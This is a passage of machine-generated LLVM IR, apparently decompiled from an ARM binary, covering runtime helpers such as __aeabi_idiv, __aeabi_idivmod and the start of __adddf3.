  %v1_1a1b8 = phi i1 [ %v1_1a1b8.pre, %bb ], [ %v1_1a1a8, %dec_label_pc_1a1a8 ]
  %v0_1a1b8 = phi i1 [ %v0_1a1b8.pre, %bb ], [ %v2_1a1a8, %dec_label_pc_1a1a8 ]
  %v3_1a1b8 = xor i1 %v2_1a1b8, %v1_1a1b8
  %v4_1a1b8 = or i1 %v0_1a1b8, %v3_1a1b8
  br i1 %v4_1a1b8, label %dec_label_pc_1a1bc, label %.dec_label_pc_1a1c0_crit_edge

.dec_label_pc_1a1c0_crit_edge:                    ; preds = %bb22
  %v1_1a1c4.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1a1c0

dec_label_pc_1a1bc:                               ; preds = %dec_label_pc_1a174, %dec_label_pc_1a150, %bb22
  br label %dec_label_pc_1a1c0

dec_label_pc_1a1c0:                               ; preds = %.dec_label_pc_1a1c0_crit_edge, %dec_label_pc_1a1bc
  %v1_1a1c4 = phi i32 [ %v1_1a1c4.pre, %.dec_label_pc_1a1c0_crit_edge ], [ -1, %dec_label_pc_1a1bc ]
  %v2_1a1c0 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_1a1c0, i32* @r4, align 4
  store i32 %v6_1a11c, i32* @r5, align 4
  store i32 %v9_1a11c, i32* @r6, align 4
  ret i32 %v1_1a1c4

; uselistorder directives
  uselistorder i32 %v0_1a1a8, { 0, 2, 1 }
  uselistorder i32 %v0_1a190.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1a184, { 1, 0 }
  uselistorder i32 %v2_1a174, { 1, 0 }
  uselistorder i32 %v1_1a168, { 2, 0, 3, 1, 4 }
  uselistorder i32 %v0_1a17c, { 2, 4, 0, 1, 5, 3, 6, 7, 8 }
  uselistorder i32 %v1_1a14c, { 1, 0 }
  uselistorder i1 %v2_1a19024, { 1, 0 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i1* %cpsr_v.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i1* %cpsr_n.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i8 0, { 8, 47, 1, 2, 49, 48, 50, 3, 51, 30, 52, 10, 11, 53, 4, 54, 55, 57, 56, 33, 58, 34, 12, 60, 59, 13, 14, 15, 16, 17, 62, 61, 35, 63, 5, 64, 65, 66, 31, 32, 68, 69, 67, 71, 70, 36, 72, 18, 73, 74, 19, 75, 6, 76, 45, 77, 20, 21, 22, 23, 24, 25, 78, 79, 80, 81, 82, 37, 84, 85, 86, 87, 83, 26, 27, 0, 88, 89, 90, 28, 9, 92, 91, 29, 93, 94, 95, 38, 96, 97, 7, 98, 100, 39, 101, 102, 99, 103, 104, 105, 106, 108, 107, 109, 110, 111, 112, 113, 115, 114, 116, 40, 118, 117, 46, 119, 41, 120, 122, 123, 121, 42, 124, 125, 44, 126, 43, 127, 128, 129, 130, 131 }
  uselistorder i32 ()* @memcpy, { 16, 15, 14, 9, 8, 7, 3, 2, 1, 23, 6, 11, 22, 21, 0, 13, 12, 20, 19, 18, 10, 17, 5, 4 }
  uselistorder i32 (i8*)* @strlen, { 12, 10, 9, 8, 7, 5, 26, 25, 11, 16, 15, 14, 27, 24, 23, 22, 20, 21, 19, 18, 17, 13, 29, 28, 6, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 9, 5, 4, 3, 1, 2, 0, 8, 7, 6, 15, 14, 13, 12, 11, 10 }
  uselistorder label %dec_label_pc_1a1c0, { 1, 0 }
  uselistorder label %dec_label_pc_1a1bc, { 2, 0, 1 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %dec_label_pc_1a1a8, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1a19c, { 1, 0 }
  uselistorder label %dec_label_pc_1a150, { 1, 0 }
}

define i32 @__aeabi_idiv(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  %v0_1a1c8 = load i32, i32* @r1, align 4
  %v1_1a1c8 = icmp slt i32 %v0_1a1c8, 0
  %v2_1a1c8 = icmp eq i32 %v0_1a1c8, 0
  %v2_1a1cc = xor i32 %v0_1a1c8, %arg1
  br i1 %v2_1a1c8, label %dec_label_pc_1a2e0, label %dec_label_pc_1a1d4

dec_label_pc_1a1d4:                               ; preds = %entry
  br i1 %v1_1a1c8, label %bb, label %thread-pre-split

bb:                                               ; preds = %dec_label_pc_1a1d4
  %v2_1a1d4 = sub i32 0, %v0_1a1c8
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_1a1d4, %bb
  %v1_1a2a0 = phi i32 [ %v2_1a1d4, %bb ], [ %v0_1a1c8, %dec_label_pc_1a1d4 ]
  %v1_1a1d8 = add i32 %v1_1a2a0, -1
  %v7_1a1d8 = icmp eq i32 %v1_1a2a0, 1
  br i1 %v7_1a1d8, label %dec_label_pc_1a280, label %dec_label_pc_1a1e0

dec_label_pc_1a1e0:                               ; preds = %thread-pre-split
  %v1_1a1e0 = icmp slt i32 %arg1, 0
  br i1 %v1_1a1e0, label %bb85, label %bb86

bb85:                                             ; preds = %dec_label_pc_1a1e0
  %v2_1a1e4 = sub i32 0, %arg1
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_1a1e0, %bb85
  %v0_1a2d4 = phi i32 [ %arg1, %dec_label_pc_1a1e0 ], [ %v2_1a1e4, %bb85 ]
  %v3_1a1e8 = icmp uge i32 %v0_1a2d4, %v1_1a2a0
  %v9_1a1e8 = icmp eq i32 %v0_1a2d4, %v1_1a2a0
  %v2_1a1ec = xor i1 %v3_1a1e8, true
  %v3_1a1ec = or i1 %v9_1a1e8, %v2_1a1ec
  br i1 %v3_1a1ec, label %dec_label_pc_1a28c, label %dec_label_pc_1a1f0

dec_label_pc_1a1f0:                               ; preds = %bb86
  %v2_1a1f0 = and i32 %v1_1a1d8, %v1_1a2a0
  %v4_1a1f0 = icmp eq i32 %v2_1a1f0, 0
  br i1 %v4_1a1f0, label %dec_label_pc_1a29c, label %dec_label_pc_1a1f8

dec_label_pc_1a1f8:                               ; preds = %dec_label_pc_1a1f0
  %v3_1a1f8 = icmp ult i32 %v1_1a2a0, 536870912
  br i1 %v3_1a1f8, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_1a1f8
  %v4_1a1fc = mul i32 %v1_1a2a0, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_1a1f8, %.thread
  %v0_1a21c.pr40.ph = phi i32 [ %v4_1a1fc, %.thread ], [ %v1_1a2a0, %dec_label_pc_1a1f8 ]
  %storemerge143 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_1a1f8 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb89
  %v0_1a21c.pr40 = phi i32 [ %v4_1a210, %bb89 ], [ %v0_1a21c.pr40.ph, %.preheader.preheader ]
  %v1_1a214 = phi i32 [ %v4_1a214, %bb89 ], [ %storemerge143, %.preheader.preheader ]
  %v2_1a208 = icmp ugt i32 %v0_1a21c.pr40, 268435455
  br i1 %v2_1a208, label %.thread3, label %bb87

.thread3:                                         ; preds = %.preheader
  br label %dec_label_pc_1a21cthread-pre-split.loopexit

bb87:                                             ; preds = %.preheader
  %v4_1a20c = icmp ult i32 %v0_1a21c.pr40, %v0_1a2d4
  br i1 %v4_1a20c, label %bb88, label %dec_label_pc_1a21cthread-pre-split.loopexit.loopexit

bb88:                                             ; preds = %bb87
  %v2_1a210 = and i32 %v0_1a21c.pr40, 268435456
  %v3_1a210 = icmp eq i32 %v2_1a210, 0
  %v4_1a210 = mul i32 %v0_1a21c.pr40, 16
  br i1 %v3_1a210, label %bb89, label %dec_label_pc_1a21c.loopexit

bb89:                                             ; preds = %bb88
  %v2_1a214 = and i32 %v1_1a214, 268435456
  %v3_1a214 = icmp eq i32 %v2_1a214, 0
  %v4_1a214 = mul i32 %v1_1a214, 16
  br i1 %v3_1a214, label %.preheader, label %dec_label_pc_1a21cthread-pre-split.loopexit.loopexit

dec_label_pc_1a21cthread-pre-split.loopexit.loopexit: ; preds = %bb89, %bb87
  %v1_1a22852.ph = phi i32 [ %v1_1a214, %bb87 ], [ %v4_1a214, %bb89 ]
  %v0_1a21c.pr42.ph = phi i32 [ %v0_1a21c.pr40, %bb87 ], [ %v4_1a210, %bb89 ]
  br label %dec_label_pc_1a21cthread-pre-split.loopexit

dec_label_pc_1a21cthread-pre-split.loopexit:      ; preds = %dec_label_pc_1a21cthread-pre-split.loopexit.loopexit, %.thread3
  %v1_1a22852 = phi i32 [ %v1_1a214, %.thread3 ], [ %v1_1a22852.ph, %dec_label_pc_1a21cthread-pre-split.loopexit.loopexit ]
  %v0_1a21c.pr42 = phi i32 [ %v0_1a21c.pr40, %.thread3 ], [ %v0_1a21c.pr42.ph, %dec_label_pc_1a21cthread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_1a21cthread-pre-split

dec_label_pc_1a21cthread-pre-split:               ; preds = %dec_label_pc_1a21cthread-pre-split.loopexit, %bb91
  %v1_1a22850 = phi i32 [ %v1_1a22852, %dec_label_pc_1a21cthread-pre-split.loopexit ], [ %v3_1a228, %bb91 ]
  %v2_1a22048 = phi i32 [ %v0_1a2d4, %dec_label_pc_1a21cthread-pre-split.loopexit ], [ %v2_1a220, %bb91 ]
  %v0_1a21c.pr = phi i32 [ %v0_1a21c.pr42, %dec_label_pc_1a21cthread-pre-split.loopexit ], [ %v3_1a224, %bb91 ]
  br label %dec_label_pc_1a21c

dec_label_pc_1a21c.loopexit:                      ; preds = %bb88
  br label %dec_label_pc_1a21c

dec_label_pc_1a21c:                               ; preds = %dec_label_pc_1a21c.loopexit, %dec_label_pc_1a21cthread-pre-split
  %v1_1a228 = phi i32 [ %v1_1a22850, %dec_label_pc_1a21cthread-pre-split ], [ %v1_1a214, %dec_label_pc_1a21c.loopexit ]
  %v2_1a220 = phi i32 [ %v2_1a22048, %dec_label_pc_1a21cthread-pre-split ], [ %v0_1a2d4, %dec_label_pc_1a21c.loopexit ]
  %v1_1a224 = phi i32 [ %v0_1a21c.pr, %dec_label_pc_1a21cthread-pre-split ], [ %v4_1a210, %dec_label_pc_1a21c.loopexit ]
  %v2_1a21c = icmp slt i32 %v1_1a224, 0
  br i1 %v2_1a21c, label %dec_label_pc_1a230, label %bb90

bb90:                                             ; preds = %dec_label_pc_1a21c
  %v4_1a220 = icmp ult i32 %v1_1a224, %v2_1a220
  br i1 %v4_1a220, label %bb91, label %dec_label_pc_1a230

bb91:                                             ; preds = %bb90
  %v3_1a224 = mul i32 %v1_1a224, 2
  %v2_1a228 = icmp slt i32 %v1_1a228, 0
  %v3_1a228 = mul i32 %v1_1a228, 2
  br i1 %v2_1a228, label %dec_label_pc_1a230, label %dec_label_pc_1a21cthread-pre-split

dec_label_pc_1a230:                               ; preds = %bb90, %dec_label_pc_1a21c, %bb91
  %v2_1a23c63 = phi i32 [ %v3_1a228, %bb91 ], [ %v1_1a228, %bb90 ], [ %v1_1a228, %dec_label_pc_1a21c ]
  %v1_1a23455 = phi i32 [ %v3_1a224, %bb91 ], [ %v1_1a224, %bb90 ], [ %v1_1a224, %dec_label_pc_1a21c ]
  br label %dec_label_pc_1a234

dec_label_pc_1a234:                               ; preds = %.thread13, %dec_label_pc_1a230
  %v1_1a268 = phi i32 [ %v4_1a268, %.thread13 ], [ %v2_1a23c63, %dec_label_pc_1a230 ]
  %v1_1a23c = phi i32 [ %v1_1a278, %.thread13 ], [ 0, %dec_label_pc_1a230 ]
  %v1_1a26c = phi i32 [ %v4_1a26c, %.thread13 ], [ %v1_1a23455, %dec_label_pc_1a230 ]
  %v1_1a238 = phi i32 [ %v0_1a264, %.thread13 ], [ %v0_1a2d4, %dec_label_pc_1a230 ]
  %v3_1a234 = icmp ult i32 %v1_1a238, %v1_1a26c
  br i1 %v3_1a234, label %.thread8, label %bb92

bb92:                                             ; preds = %dec_label_pc_1a234
  %v3_1a238 = sub i32 %v1_1a238, %v1_1a26c
  %v3_1a23c = or i32 %v1_1a23c, %v1_1a268
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1a234, %bb92
  %v1_1a244 = phi i32 [ %v1_1a238, %dec_label_pc_1a234 ], [ %v3_1a238, %bb92 ]
  %v1_1a248 = phi i32 [ %v1_1a23c, %dec_label_pc_1a234 ], [ %v3_1a23c, %bb92 ]
  %v4_1a240 = udiv i32 %v1_1a26c, 2
  %v6_1a240 = icmp ult i32 %v1_1a244, %v4_1a240
  br i1 %v6_1a240, label %.thread9, label %bb93

bb93:                                             ; preds = %.thread8
  %v3_1a244 = urem i32 %v1_1a26c, 2
  %v4_1a244 = icmp eq i32 %v3_1a244, 0
  %v6_1a244 = sub i32 %v1_1a244, %v4_1a240
  br i1 %v4_1a244, label %.thread9, label %bb94

bb94:                                             ; preds = %bb93
  %v5_1a248 = udiv i32 %v1_1a268, 2
  %v6_1a248 = or i32 %v1_1a248, %v5_1a248
  br label %.thread9

.thread9:                                         ; preds = %bb93, %.thread8, %bb94
  %v1_1a250 = phi i32 [ %v6_1a244, %bb93 ], [ %v1_1a244, %.thread8 ], [ %v6_1a244, %bb94 ]
  %v1_1a254 = phi i32 [ %v1_1a248, %bb93 ], [ %v1_1a248, %.thread8 ], [ %v6_1a248, %bb94 ]
  %v4_1a24c = udiv i32 %v1_1a26c, 4
  %v6_1a24c = icmp ult i32 %v1_1a250, %v4_1a24c
  br i1 %v6_1a24c, label %.thread10, label %bb95

bb95:                                             ; preds = %.thread9
  %v3_1a250 = and i32 %v1_1a26c, 2
  %v4_1a250 = icmp eq i32 %v3_1a250, 0
  %v6_1a250 = sub i32 %v1_1a250, %v4_1a24c
  br i1 %v4_1a250, label %.thread10, label %bb96

bb96:                                             ; preds = %bb95
  %v5_1a254 = udiv i32 %v1_1a268, 4
  %v6_1a254 = or i32 %v1_1a254, %v5_1a254
  br label %.thread10

.thread10:                                        ; preds = %bb95, %.thread9, %bb96
  %v1_1a25c = phi i32 [ %v6_1a250, %bb95 ], [ %v1_1a250, %.thread9 ], [ %v6_1a250, %bb96 ]
  %v1_1a260 = phi i32 [ %v1_1a254, %bb95 ], [ %v1_1a254, %.thread9 ], [ %v6_1a254, %bb96 ]
  %v4_1a258 = udiv i32 %v1_1a26c, 8
  %v6_1a258 = icmp ult i32 %v1_1a25c, %v4_1a258
  br i1 %v6_1a258, label %thread-pre-split12, label %bb97

bb97:                                             ; preds = %.thread10
  %v3_1a25c = and i32 %v1_1a26c, 4
  %v4_1a25c = icmp eq i32 %v3_1a25c, 0
  %v6_1a25c = sub i32 %v1_1a25c, %v4_1a258
  br i1 %v4_1a25c, label %thread-pre-split12, label %bb98

bb98:                                             ; preds = %bb97
  %v5_1a260 = udiv i32 %v1_1a268, 8
  %v6_1a260 = or i32 %v1_1a260, %v5_1a260
  br label %thread-pre-split12

thread-pre-split12:                               ; preds = %bb98, %.thread10, %bb97
  %v1_1a278 = phi i32 [ %v1_1a260, %bb97 ], [ %v1_1a260, %.thread10 ], [ %v6_1a260, %bb98 ]
  %v0_1a264 = phi i32 [ %v6_1a25c, %bb97 ], [ %v1_1a25c, %.thread10 ], [ %v6_1a25c, %bb98 ]
  %v2_1a264 = icmp eq i32 %v0_1a264, 0
  br i1 %v2_1a264, label %dec_label_pc_1a274, label %bb99

bb99:                                             ; preds = %thread-pre-split12
  %tmp = icmp ult i32 %v1_1a268, 16
  br i1 %tmp, label %dec_label_pc_1a274, label %.thread13

.thread13:                                        ; preds = %bb99
  %v4_1a268 = udiv i32 %v1_1a268, 16
  %v4_1a26c = udiv i32 %v1_1a26c, 16
  br label %dec_label_pc_1a234

dec_label_pc_1a274:                               ; preds = %thread-pre-split12, %bb99
  %v1_1a274 = icmp slt i32 %v2_1a1cc, 0
  br i1 %v1_1a274, label %bb100, label %.thread16

bb100:                                            ; preds = %dec_label_pc_1a274
  %v2_1a278 = sub i32 0, %v1_1a278
  br label %.thread16

.thread16:                                        ; preds = %bb104, %bb103, %bb101, %dec_label_pc_1a280, %dec_label_pc_1a274, %bb100
  %v1_1a27c = phi i32 [ %v1_1a278, %dec_label_pc_1a274 ], [ %v2_1a278, %bb100 ], [ %arg1, %dec_label_pc_1a280 ], [ %v2_1a284, %bb101 ], [ %v1_1a29880, %bb103 ], [ %v2_1a294, %bb104 ]
  ret i32 %v1_1a27c

dec_label_pc_1a280:                               ; preds = %thread-pre-split
  br i1 %v1_1a1c8, label %bb101, label %.thread16

bb101:                                            ; preds = %dec_label_pc_1a280
  %v2_1a284 = sub i32 0, %arg1
  br label %.thread16

dec_label_pc_1a28c:                               ; preds = %bb86
  br i1 %v3_1a1e8, label %bb103, label %bb102

bb102:                                            ; preds = %dec_label_pc_1a28c
  br label %bb103

bb103:                                            ; preds = %dec_label_pc_1a28c, %bb102
  %v1_1a29880 = phi i32 [ %arg1, %dec_label_pc_1a28c ], [ 0, %bb102 ]
  br i1 %v9_1a1e8, label %bb104, label %.thread16

bb104:                                            ; preds = %bb103
  %v4_1a290 = ashr i32 %v2_1a1cc, 31
  %v2_1a294 = or i32 %v4_1a290, 1
  br label %.thread16

dec_label_pc_1a29c:                               ; preds = %dec_label_pc_1a1f0
  %v2_1a29c = icmp ugt i32 %v1_1a2a0, 65535
  br i1 %v2_1a29c, label %bb105, label %.thread19

bb105:                                            ; preds = %dec_label_pc_1a29c
  %v2_1a2a0 = and i32 %v1_1a2a0, 32768
  %v3_1a2a0 = icmp eq i32 %v2_1a2a0, 0
  %v4_1a2a0 = udiv i32 %v1_1a2a0, 65536
  br i1 %v3_1a2a0, label %.thread19, label %bb106

.thread19:                                        ; preds = %bb105, %dec_label_pc_1a29c
  %v0_1a2ac70 = phi i32 [ %v1_1a2a0, %dec_label_pc_1a29c ], [ %v4_1a2a0, %bb105 ]
  br label %bb106

bb106:                                            ; preds = %bb105, %.thread19
  %v1_1a2b0 = phi i32 [ %v0_1a2ac70, %.thread19 ], [ %v4_1a2a0, %bb105 ]
  %storemerge = phi i32 [ 0, %.thread19 ], [ 16, %bb105 ]
  %v2_1a2ac = icmp ugt i32 %v1_1a2b0, 255
  br i1 %v2_1a2ac, label %bb107, label %.thread20

bb107:                                            ; preds = %bb106
  %v2_1a2b0 = and i32 %v1_1a2b0, 128
  %v3_1a2b0 = icmp eq i32 %v2_1a2b0, 0
  %v4_1a2b0 = udiv i32 %v1_1a2b0, 256
  br i1 %v3_1a2b0, label %.thread20, label %bb108

bb108:                                            ; preds = %bb107
  %v2_1a2b4 = or i32 %storemerge, 8
  br label %.thread20

.thread20:                                        ; preds = %bb107, %bb106, %bb108
  %v1_1a2c0 = phi i32 [ %storemerge, %bb106 ], [ %storemerge, %bb107 ], [ %v2_1a2b4, %bb108 ]
  %v1_1a2bc = phi i32 [ %v1_1a2b0, %bb106 ], [ %v4_1a2b0, %bb107 ], [ %v4_1a2b0, %bb108 ]
  %v2_1a2b8 = icmp ugt i32 %v1_1a2bc, 15
  br i1 %v2_1a2b8, label %bb109, label %.thread21

bb109:                                            ; preds = %.thread20
  %v2_1a2bc = and i32 %v1_1a2bc, 8
  %v3_1a2bc = icmp eq i32 %v2_1a2bc, 0
  %v4_1a2bc = udiv i32 %v1_1a2bc, 16
  br i1 %v3_1a2bc, label %.thread21, label %bb110

bb110:                                            ; preds = %bb109
  %v2_1a2c0 = add nsw i32 %v1_1a2c0, 4
  br label %.thread21

.thread21:                                        ; preds = %bb109, %.thread20, %bb110
  %v4_1a2c8 = phi i32 [ %v1_1a2c0, %.thread20 ], [ %v1_1a2c0, %bb109 ], [ %v2_1a2c0, %bb110 ]
  %v5_1a2cc = phi i32 [ %v1_1a2bc, %.thread20 ], [ %v4_1a2bc, %bb109 ], [ %v4_1a2bc, %bb110 ]
  %v2_1a2c4 = icmp ugt i32 %v5_1a2cc, 3
  %v7_1a2c4 = icmp eq i32 %v5_1a2cc, 4
  %v2_1a2c8 = xor i1 %v7_1a2c4, true
  %v3_1a2c8 = and i1 %v2_1a2c4, %v2_1a2c8
  br i1 %v3_1a2c8, label %bb111, label %bb112

bb111:                                            ; preds = %.thread21
  %v5_1a2c8 = add nsw i32 %v4_1a2c8, 3
  br label %bb112

bb112:                                            ; preds = %.thread21, %bb111
  %v4_1a2cc = phi i32 [ %v4_1a2c8, %.thread21 ], [ %v5_1a2c8, %bb111 ]
  %v2_1a2cc = xor i1 %v2_1a2c4, true
  %v3_1a2cc = or i1 %v7_1a2c4, %v2_1a2cc
  br i1 %v3_1a2cc, label %bb113, label %bb114

bb113:                                            ; preds = %bb112
  %v8_1a2cc = udiv i32 %v5_1a2cc, 2
  %v9_1a2cc = add i32 %v4_1a2cc, %v8_1a2cc
  br label %bb114

bb114:                                            ; preds = %bb112, %bb113
  %v1_1a2d4 = phi i32 [ %v4_1a2cc, %bb112 ], [ %v9_1a2cc, %bb113 ]
  %v1_1a2d0 = icmp slt i32 %v2_1a1cc, 0
  %v6_1a2d4 = lshr i32 %v0_1a2d4, %v1_1a2d4
  %v2_1a2d8 = sub i32 0, %v6_1a2d4
  %v2_1a2d8.v6_1a2d4 = select i1 %v1_1a2d0, i32 %v2_1a2d8, i32 %v6_1a2d4
  ret i32 %v2_1a2d8.v6_1a2d4

dec_label_pc_1a2e0:                               ; preds = %entry
  %v0_1a2e4 = call i32 @__div0()
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_1a2cc, { 1, 0 }
  uselistorder i1 %v7_1a2c4, { 1, 0 }
  uselistorder i32 %v4_1a2bc, { 1, 0 }
  uselistorder i32 %v1_1a2bc, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1a2b0, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_1a2b0, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1a2a0, { 1, 0 }
  uselistorder i32 %v0_1a264, { 1, 0 }
  uselistorder i32 %v4_1a258, { 1, 0 }
  uselistorder i32 %v1_1a260, { 1, 2, 0 }
  uselistorder i32 %v4_1a24c, { 1, 0 }
  uselistorder i32 %v1_1a254, { 1, 2, 0 }
  uselistorder i32 %v4_1a240, { 1, 0 }
  uselistorder i32 %v1_1a248, { 1, 2, 0 }
  uselistorder i32 %v1_1a26c, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_1a23c, { 1, 0 }
  uselistorder i32 %v1_1a268, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_1a228, { 1, 0 }
  uselistorder i32 %v3_1a224, { 1, 0 }
  uselistorder i32 %v1_1a224, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_1a220, { 1, 0 }
  uselistorder i32 %v1_1a228, { 1, 2, 0, 3 }
  uselistorder i32 %v4_1a214, { 1, 0 }
  uselistorder i32 %v4_1a210, { 2, 1, 0 }
  uselistorder i32 %v1_1a214, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_1a21c.pr40, { 1, 2, 0, 5, 4, 3 }
  uselistorder i1 %v3_1a1e8, { 1, 0 }
  uselistorder i32 %v1_1a2a0, { 5, 1, 6, 7, 3, 2, 0, 4, 8, 9, 10, 11 }
  uselistorder i32 %v2_1a1cc, { 1, 0, 2 }
  uselistorder i32 %v0_1a1c8, { 2, 1, 0, 4, 3 }
  uselistorder i32 ()* @__div0, { 1, 0 }
  uselistorder i32 %arg1, { 4, 5, 6, 3, 2, 1, 0 }
  uselistorder label %bb114, { 1, 0 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %.thread21, { 2, 0, 1 }
  uselistorder label %.thread20, { 2, 0, 1 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread16, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_1a274, { 1, 0 }
  uselistorder label %thread-pre-split12, { 0, 2, 1 }
  uselistorder label %.thread10, { 2, 0, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_1a230, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1a21cthread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @__aeabi_idivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_1a2f8 = sdiv i32 %arg1, %arg2
  ret i32 %v2_1a2f8
}

define i32 @__aeabi_drsub(double %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = sext i32 %arg3 to i64
  %v8_1a310 = bitcast i64 %tmp to double
  %v9_1a310 = fadd double %v8_1a310, %arg1
  %v10_1a310 = fptrunc double %v9_1a310 to float
  %v11_1a310 = bitcast float %v10_1a310 to i32
  ret i32 %v11_1a310
}

define i32 @__aeabi_dsub(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_1a314 = load i32, i32* @r0, align 4
  ret i32 %v2_1a314
}

define i32 @__adddf3(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1a318 = load i32, i32* @r4, align 4
  store i32 %v3_1a318, i32* %stack_var_-12, align 4
  %v6_1a318 = load i32, i32* @r5, align 4
  %v9_1a318 = load i32, i32* @lr, align 4
  %v0_1a31c = load i32, i32* %r1.global-to-local, align 4
  %v2_1a31c = mul i32 %v0_1a31c, 2
  store i32 %v2_1a31c, i32* %r4.global-to-local, align 4
  %v0_1a320 = load i32, i32* %r3.global-to-local, align 4
  %v2_1a320 = mul i32 %v0_1a320, 2
  store i32 %v2_1a320, i32* %r5.global-to-local, align 4
  %v4_1a324 = icmp eq i32 %v2_1a320, %v2_1a31c
  %v1_1a328 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v4_1a324, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v2_1a328 = load i32, i32* %r2.global-to-local, align 4
  %v5_1a328 = icmp eq i32 %v2_1a328, %v1_1a328
  br i1 %v5_1a328, label %.thread3, label %.thread

.thread:                                          ; preds = %entry, %bb
  %v3_1a32c = or i32 %v1_1a328, %v2_1a31c
  %v5_1a32c = icmp eq i32 %v3_1a32c, 0
  br i1 %v5_1a32c, label %.thread3, label %bb10

bb10:                                             ; preds = %.thread
  %v2_1a330 = load i32, i32* %r2.global-to-local, align 4
  %v3_1a330 = or i32 %v2_1a330, %v2_1a320
  %v5_1a330 = icmp eq i32 %v3_1a330, 0
  br i1 %v5_1a330, label %.thread3, label %bb11

bb11:                                             ; preds = %bb10
  %v2_1a31c.off = add i32 %v2_1a31c, 4194303
  %tmp = icmp ult i32 %v2_1a31c.off, 2097152
  br i1 %tmp, label %.thread3, label %bb12

bb12:                                             ; preds = %bb11
  %v2_1a320.off = add i32 %v2_1a320, 4194303
  %tmp17 = icmp ult i32 %v2_1a320.off, 2097152
  br label %.thread3

.thread3:                                         ; preds = %.thread, %bb, %bb10, %bb11, %bb12
  %v0_1a33c = phi i1 [ true, %bb10 ], [ true, %bb11 ], [ %tmp17, %bb12 ], [ true, %bb ], [ true, %.thread ]
  call void @__pseudo_cond_branch(i1 %v0_1a33c, i32 ptrtoint (i32* @global_var_1a574.980 to i32))
  %v0_1a340 = load i32, i32* %r4.global-to-local, align 4
  %v3_1a340 = udiv i32 %v0_1a340, 2097152
  store i32 %v3_1a340, i32* %r4.global-to-local, align 4
  %v1_1a344 = load i32, i32* %r5.global-to-local, align 4
  %v4_1a344 = udiv i32 %v1_1a344, 2097152
  %v5_1a344 = sub nsw i32 %v4_1a344, %v3_1a340
  %v5_1a348 = icmp ult i32 %v4_1a344, %v3_1a340
  br i1 %v5_1a348, label %bb13, label %bb14

bb13:                                             ; preds = %.thread3
  %v7_1a348 = sub nsw i32 0, %v5_1a344
  br label %bb14

bb14:                                             ; preds = %.thread3, %bb13
  %storemerge = phi i32 [ %v7_1a348, %bb13 ], [ %v5_1a344, %.thread3 ]
  %v0_1a36c = phi i32 [ %v7_1a348, %bb13 ], [ %v5_1a344, %.thread3 ]
  store i32 %storemerge, i32* %r5.global-to-local, align 4
  %v7_1a34c = icmp ugt i32 %v4_1a344, %v3_1a340
  br i1 %v7_1a34c, label %dec_label_pc_1a350, label %dec_label_pc_1a36c

dec_label_pc_1a350:                               ; preds = %bb14
  %v2_1a350 = add nsw i32 %v0_1a36c, %v3_1a340
  store i32 %v2_1a350, i32* %r4.global-to-local, align 4
  %v0_1a354 = load i32, i32* %r0.global-to-local, align 4
  %v1_1a354 = load i32, i32* %r2.global-to-local, align 4
  %v0_1a358 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a358 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_1a354, i32* %r0.global-to-local, align 4
  store i32 %v1_1a358, i32* %r1.global-to-local, align 4
  store i32 %v0_1a354, i32* %r2.global-to-local, align 4
  store i32 %v0_1a358, i32* %r3.global-to-local, align 4
